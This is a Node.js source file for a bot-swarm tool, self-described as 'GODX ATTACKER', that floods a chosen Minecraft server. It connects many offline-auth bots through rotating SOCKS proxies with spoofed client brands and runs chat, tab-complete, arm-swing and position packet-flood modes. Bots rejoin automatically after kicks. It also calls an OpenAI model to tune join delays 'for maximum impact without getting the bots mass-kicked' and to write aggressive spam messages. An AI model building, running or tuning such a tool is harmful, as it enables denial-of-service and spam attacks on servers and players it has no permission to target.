const mineflayer = require('mineflayer');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { SocksProxyAgent } = require('socks-proxy-agent');
const path = require('path');
const { OpenAI } = require("openai");

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY || process.env.AI_INTEGRATIONS_OPENAI_API_KEY,
  baseURL: process.env.OPENAI_API_KEY ? undefined : process.env.AI_INTEGRATIONS_OPENAI_BASE_URL,
});
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling']
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

let bots = [];
let botConfig = {
    host: 'localhost',
    port: 25565,
    version: false,
    count: 0,
    proxies: [],
    mode: 'stay',
    intensity: 5,
    joinDelay: 500,
    username: 'GODX'
};

let packetCount = 0;
setInterval(() => {
    lastPktSec = packetCount;
    io.emit('traffic-data', {
        packets: packetCount,
        bots: bots.length,
        timestamp: Date.now()
    });
    packetCount = 0;
}, 1000);

let isPaused = false;
let aiActive = false;
let targetServerHealth = 100;
let lastPktSec = 0;

async function runAiOptimization() {
    if (!aiActive || bots.length === 0) return;

    try {
        const prompt = `Current Status:
        - Active Bots: ${bots.length}/${botConfig.count}
        - Packets/Sec: ${lastPktSec}
        - Join Delay: ${botConfig.joinDelay}ms
        - Mode: ${botConfig.mode}
        
        Analyze the server stability. If Packets/Sec is dropping while bots are constant, the server might be throttling. 
        Adjust the 'joinDelay' and 'intensity' for maximum impact without getting the bots mass-kicked.
        Return ONLY a JSON object with: {"joinDelay": number, "intensity": number, "reason": "string"}`;

        const response = await openai.chat.completions.create({
            model: "gpt-4o-mini",
            messages: [{ role: "user", content: prompt }],
            response_format: { type: "json_object" }
        });

        const optimization = JSON.parse(response.choices[0].message.content);
        botConfig.joinDelay = optimization.joinDelay;
        botConfig.intensity = optimization.intensity;
        io.emit('ai-log', { msg: `AI optimization applied: ${optimization.reason}`, settings: optimization });
    } catch (e) {
        console.error('AI Optimization failed', e);
    }
}

setInterval(runAiOptimization, 30000);

io.on('connection', (socket) => {
    socket.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });

    socket.on('start-test', (data) => {
        isPaused = false;
        botConfig = {
            ...botConfig,
            ...data,
            intensity: parseInt(data.intensity) || 5
        };
        aiActive = !!data.aiActive;
        startBots(parseInt(data.count) || 0);
    });

    socket.on('update-config', (data) => {
        botConfig = {
            ...botConfig,
            ...data,
            intensity: parseInt(data.intensity) || botConfig.intensity
        };
        io.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });
    });

    socket.on('toggle-ai', (data) => {
        aiActive = data.enabled;
        io.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });
    });

    socket.on('broadcast-chat', (msg) => {
        bots.forEach(bot => {
            try { bot.chat(msg); } catch(e) {}
        });
    });

    socket.on('stop-test', () => {
        isPaused = false;
        stopBots();
    });

    socket.on('pause-test', () => {
        isPaused = true;
        io.emit('pause-status', { isPaused: true });
    });

    socket.on('resume-test', () => {
        isPaused = false;
        io.emit('pause-status', { isPaused: false });
    });
});

function createSingleBot(i, total) {
    const baseUsername = botConfig.username || 'CRYSTAL';
    const randomSuffix = Math.floor(Math.random() * 90000 + 10000);
    const botUsername = `${baseUsername}_${i}_${randomSuffix}`.substring(0, 16);
    
    // Validate target
    if (!botConfig.host || botConfig.host === 'localhost') {
        console.warn('Bot joining localhost - please ensure target host is set');
    }

    const currentProxyList = botConfig.proxies && botConfig.proxies.length > 0 ? botConfig.proxies : [];
    
    const botOptions = {
        host: botConfig.host,
        port: parseInt(botConfig.port),
        username: botUsername,
        version: botConfig.version && botConfig.version !== 'auto' ? botConfig.version : false,
        hideErrors: true, 
        checkTimeoutInterval: 120000, // Doubled timeout
        connectTimeout: 120000, // Doubled timeout
        auth: 'offline',
        onMoping: true,
        skipValidation: true,
        colorsEnabled: false,
        chatLengthLimit: 256,
        brand: ['vanilla', 'fabric', 'forge', 'quilt', 'lunarclient'][Math.floor(Math.random() * 5)]
    };

    if (currentProxyList.length > 0) {
        const proxy = currentProxyList[i % currentProxyList.length];
        try {
            let proxyUrl = proxy.includes('://') ? proxy : `socks5://${proxy}`;
            botOptions.agent = new SocksProxyAgent(proxyUrl);
        } catch (e) {
            console.error(`Invalid proxy configuration: ${proxy}`);
        }
    }

    try {
        const bot = mineflayer.createBot(botOptions);

    bot.on('chat', (username, message) => {
        try {
            io.emit('server-msg', { user: username, msg: message });
        } catch (e) {}
    });

    bot.on('login', () => {
        console.log(`[${bot.username}] Bot logged in!`);
        const jitter = Math.random() * 2000;
        setTimeout(() => {
            if (!bots.includes(bot)) {
                bots.push(bot);
            }
            io.emit('bot-status', { username: bot.username, status: 'joined' });
            io.emit('status', { count: bots.length, config: botConfig });
            
            // Stay alive packet variance
            const keepAliveInterval = setInterval(() => {
                if (bot._client && bot.entity) {
                    try {
                        if (!isPaused) {
                            bot.look(bot.entity.yaw + (Math.random() - 0.5) * 0.1, bot.entity.pitch, true);
                        }
                    } catch (e) {}
                }
            }, 15000 + Math.random() * 10000);

            setupBotBehavior(bot);
            
            const latencyInterval = setInterval(() => {
                if (bot._client && bot._client.latency !== undefined) {
                    // Optimized: Only emit to socket if it's significant
                }
            }, 10000);

            let hasCleanedUp = false;
            const cleanup = () => {
                if (hasCleanedUp) return;
                hasCleanedUp = true;
                clearInterval(keepAliveInterval);
                clearInterval(latencyInterval);
                clearInterval(healthCheck);
                const index = bots.indexOf(bot);
                if (index > -1) bots.splice(index, 1);
                io.emit('bot-health-update', { username: bot.username, status: 'disconnected', health: 0 });
            };

            bot.on('end', (reason) => {
                cleanup();
                if (isRunning() && bots.length < botConfig.count) {
                    const reconnectDelay = (reason === 'kick' || reason === 'disconnect.quitting') ? 500 : 2000;
                    setTimeout(() => {
                        if (isRunning() && bots.length < botConfig.count) {
                            createSingleBot(bots.length, botConfig.count);
                        }
                    }, reconnectDelay);
                }
            });

            // Monitor bot health every 10 seconds
            const healthCheck = setInterval(() => {
                if (!isRunning()) return cleanup();
                if (bot.entity) {
                    io.emit('bot-health-update', { 
                        username: bot.username, 
                        status: isPaused ? 'active' : 'attacking',
                        health: bot.health || 20
                    });
                }
                if (!bot.entity || !bot._client || bot._client.state === 'closed') {
                    cleanup();
                    if (isRunning() && bots.length < botConfig.count) {
                        createSingleBot(bots.length, botConfig.count);
                    }
                }
            }, 5000);

            bot.on('death', () => {
                io.emit('bot-status', { username: bot.username, status: 'killed' });
                addLog(`Unit ${bot.username} was neutralized. Initiating automatic redeployment...`, 'error');
                
                // Automatic response/re-join logic
                if (isRunning() && bots.length < botConfig.count) {
                    setTimeout(() => {
                        if (isRunning() && bots.length < botConfig.count) {
                             createSingleBot(bots.length, botConfig.count);
                        }
                    }, 2000);
                }
                
                setTimeout(() => { if (bot.entity) bot.respawn(); }, 1000);
            });
        }, jitter);
    });

        bot.on('spawn', () => {
            const heartbeat = setInterval(() => {
                if (bot.entity) {
                    bot.swingArm('right');
                } else {
                    clearInterval(heartbeat);
                }
            }, 10000);
        });

        bot.on('error', (err) => {
            console.error(`[${botOptions.username}] Bot error: ${err.message}`);
            io.emit('bot-status', { username: botOptions.username, status: 'error' });
        });

        bot.on('kicked', (reason) => {
            console.warn(`[${botOptions.username}] Bot kicked: ${reason}`);
            io.emit('bot-status', { username: botOptions.username, status: 'kicked' });
        });

        bot.on('end', () => {
            console.log(`[${botOptions.username}] Bot connection ended`);
            io.emit('bot-status', { username: botOptions.username, status: 'disconnected' });
            const index = bots.indexOf(bot);
            if (index > -1) {
                bots.splice(index, 1);
            }
            io.emit('status', { count: bots.length, config: botConfig });
        });

    } catch (err) {
        console.error('Bot creation failed', err);
    }
}

function isRunning() {
    return activeTimeouts.length > 0 || bots.length > 0;
}

function setupBotBehavior(bot) {
    const originalChat = bot.chat;
    bot.chat = function(msg) {
        if (isPaused) return;
        packetCount++;
        // Optimized: Removed heavy chat log broadcast
        try {
            return originalChat.apply(this, arguments);
        } catch (e) {
            console.error('Chat failed', e);
        }
    };

    if (bot._client) {
        bot._client.on('error', (err) => {
            // console.error('Client protocol error', err.message);
        });

        const originalWrite = bot._client.write;
        bot._client.write = function(name, params) {
            if (isPaused && name !== 'keep_alive' && name !== 'teleport_confirm') return;
            packetCount++;
            // Optimized: Removed heavy movement broadcast
            return originalWrite.apply(this, arguments);
        };

        bot._client.on('packet', (data, metadata) => {
            if (isPaused) return;
            // Optimized: Removed heavy combat log broadcast
        });
    }

    const intervals = [];

    if (botConfig.mode === 'ai-chat') {
        const interval = setInterval(async () => {
            if (isPaused) return;
            if (!bot.entity) return;
            try {
                const prompt = `You are a professional security testing bot named ${bot.username}. 
                Generate a short, aggressive, and highly realistic message to send to a Minecraft server chat. 
                The message should look like it's from a real player but focused on protocol analysis and stress testing. 
                Keep it under 80 characters. No emojis.`;

                const response = await openai.chat.completions.create({
                    model: "gpt-4o-mini",
                    messages: [{ role: "user", content: prompt }],
                    max_tokens: 30
                });

                const msg = response.choices[0].message.content.trim();
                bot.chat(msg);
            } catch (e) {
                // Fallback to randomized string if AI fails
                bot.chat(`[CRYSTAL-AI] Protocol Stress ${Math.random().toString(36).substring(7)}`);
            }
        }, Math.max(5000, 15000 - (botConfig.intensity * 1200)));
        intervals.push(interval);
    } else if (botConfig.mode === 'move') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            bot.setControlState('forward', true);
            bot.setControlState('jump', Math.random() > 0.5);
            bot.look(Math.random() * Math.PI * 2, (Math.random() - 0.5) * (Math.PI / 2));
            
            setTimeout(() => {
                if(bot.entity) {
                    bot.setControlState('forward', false);
                    bot.setControlState('jump', false);
                }
            }, 200 + Math.random() * 500);
        }, 100);
        intervals.push(interval);
    } else if (botConfig.mode === 'spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            // High frequency chat spam
            bot.chat(`[CRYSTAL-XDR] ${Math.random().toString(36).substring(2, 10)} ${Date.now().toString().slice(-4)}`);
            bot.chat(`[STORM] ${Math.random().toString(36).substring(2, 12)}`);
        }, Math.max(20, 100 - (botConfig.intensity * 8)));
        intervals.push(interval);
    } else if (botConfig.mode === 'tab-spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity || !bot._client) return clearInterval(interval);
            try {
                // Triple packet burst for tab-spam
                for(let i=0; i<3; i++) {
                    bot._client.write('tab_complete', {
                        text: '/',
                        assume_command: false,
                        look_at_block: null
                    });
                }
            } catch (e) {}
        }, Math.max(10, 500 - (botConfig.intensity * 45)));
        intervals.push(interval);
    } else if (botConfig.mode === 'arm-spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return clearInterval(interval);
            bot.swingArm('right');
            bot.swingArm('left');
            // Packet flood via look desync
            bot.look(bot.entity.yaw + 0.1, bot.entity.pitch, true);
        }, Math.max(10, 150 - (botConfig.intensity * 14)));
        intervals.push(interval);
    } else if (botConfig.mode === 'position-flood') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return clearInterval(interval);
            // High frequency movement packets
            for(let i=0; i<5; i++) {
                bot.entity.position.x += (Math.random() - 0.5) * 0.1;
                bot.entity.position.z += (Math.random() - 0.5) * 0.1;
            }
        }, Math.max(10, 250 - (botConfig.intensity * 24)));
        intervals.push(interval);
    } else if (botConfig.mode === 'block-interact') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            try {
                bot.swingArm('right');
                const block = bot.blockAt(bot.entity.position.offset(0, -1, 0));
                if (block) bot.activateBlock(block);
            } catch (e) {
                // Silently handle interaction errors to prevent bot crashes
            }
        }, Math.max(200, 2000 - (botConfig.intensity * 180)));
        intervals.push(interval);
    }

    bot.on('end', () => {
        intervals.forEach(clearInterval);
    });
}

let activeTimeouts = [];

function startBots(count) {
    stopBots();
    // Anti-throttling: Dynamic delay with exponential backoff feel
    const baseDelay = Math.max(2000, parseInt(botConfig.joinDelay) || 2000);
    
    for (let i = 0; i < count; i++) {
        // Incremental delay to prevent mass-kicking
        const rawDelay = i * baseDelay + (Math.random() * 1000);
        const jitteredDelay = Math.floor(Math.min(rawDelay, 2147483647));
        const timeout = setTimeout(() => {
            if (bots.length >= count) return;
            createSingleBot(bots.length, count);
        }, jitteredDelay);
        activeTimeouts.push(timeout);
    }
}

function stopBots() {
    activeTimeouts.forEach(clearTimeout);
    activeTimeouts = [];
    
    bots.forEach(bot => {
        try { 
            bot.end();
        } catch(e) {}
    });
    bots = [];
    io.emit('status', { count: 0, config: botConfig });
}

process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection', reason);
});

// Explicitly listen on all interfaces and the port provided by the environment
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`GODX ATTACKER Professional Tool running on port ${PORT}`);
});

// Ensure a fast health check endpoint exists for Autoscale
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});
